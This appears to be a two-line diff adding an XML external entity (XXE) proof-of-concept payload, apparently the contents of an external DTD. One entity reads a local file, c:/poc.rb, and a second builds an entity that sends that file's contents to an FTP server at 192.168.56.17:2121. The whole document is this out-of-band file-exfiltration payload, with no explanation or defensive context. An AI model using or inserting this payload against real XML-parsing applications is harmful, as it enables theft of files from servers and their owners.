@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM “file:///c:/poc.rb”>
+<!ENTITY % ext “<!ENTITY hehe SYSTEM ‘ftp://192.168.56.17:2121/%file;’>”>
